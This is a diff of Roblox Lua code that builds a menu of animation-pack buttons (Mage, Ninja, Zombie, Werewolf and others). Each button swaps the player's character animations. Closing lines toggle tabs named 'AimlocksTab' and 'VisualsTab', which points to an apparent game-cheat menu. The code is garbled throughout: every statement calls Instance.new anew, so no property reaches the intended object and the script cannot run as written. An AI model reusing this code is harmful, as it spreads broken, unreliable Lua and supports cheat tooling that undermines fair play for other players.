+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Levitation"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.115472436, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Levitation"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Mage"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.696203232, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Mage"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Ninja"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.0597896464, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Ninja"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Pirate"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(-0.000333309174, 0, 0.874588311, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Pirate"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Robot"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.291479498, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Robot"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Stylish"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.232816339, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Stylish"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_SuperHero"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.464919746, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "SuperHero"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Toy"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(6.51925802E-09, 0, 0.756028414, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Toy"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Vampire"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.934021354, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Vampire"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Werewolf"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(-0.000333368778, 0, 0.174509808, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Werewolf"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Zombie"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(-1.1920929E-07, 0, 0.582352936, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Zombie"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "Category"
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+    Instance.new("TextLabel").BorderSizePixel = 0
+    Instance.new("TextLabel").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextLabel").Text = "Normal"
+    Instance.new("TextLabel").TextColor3 = Color3.new(0, 0.835294, 1)
+    Instance.new("TextLabel").TextSize = 14
+    Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "SpecialTab"
+    Instance.new("Frame").BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
+    Instance.new("Frame").BackgroundTransparency = 1
+    Instance.new("Frame").BorderSizePixel = 0
+    Instance.new("Frame").Position = UDim2.new(0, 0, 0.119999997, 0)
+    Instance.new("Frame").Size = UDim2.new(0, 150, 0, 230)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Patrol"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.259960413, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Patrol"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Confident"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.389248967, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Confident"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Popstar"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.130671918, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Popstar"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Cowboy"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.772964239, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Cowboy"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Ghost"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.900632322, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Ghost"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+      va.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
+      va.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Sneaky"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.517628431, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Sneaky"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Princess"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.645296335, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Princess"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "Category"
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+    Instance.new("TextLabel").BorderSizePixel = 0
+    Instance.new("TextLabel").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextLabel").Text = "Special"
+    Instance.new("TextLabel").TextColor3 = Color3.new(0, 0.835294, 1)
+    Instance.new("TextLabel").TextSize = 14
+    Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "OtherTab"
+    Instance.new("Frame").BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
+    Instance.new("Frame").BackgroundTransparency = 1
+    Instance.new("Frame").BorderSizePixel = 0
+    Instance.new("Frame").Position = UDim2.new(0, 0, 1.06800008, 0)
+    Instance.new("Frame").Size = UDim2.new(0, 150, 0, 220)
+    Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "Category"
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+    Instance.new("TextLabel").BorderSizePixel = 0
+    Instance.new("TextLabel").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextLabel").Text = "Other"
+    Instance.new("TextLabel").TextColor3 = Color3.new(0, 0.835294, 1)
+    Instance.new("TextLabel").TextSize = 14
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_None"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.134545445, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "None"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
+      va.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Anthro"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.269090891, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Anthro (Default)"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    wait(1)
+    Instance.new("Frame"):TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.Maintab.Visible = false
+    va.Parent.Parent.PlayerTab.Visible = false
+    va.Parent.Parent.VisualsTab.Visible = true
+    va.Parent.Parent.AimlocksTab.Visible = false
+    va.Parent.Parent.BoomboxTab.Visible = false
+  end)
+end)()
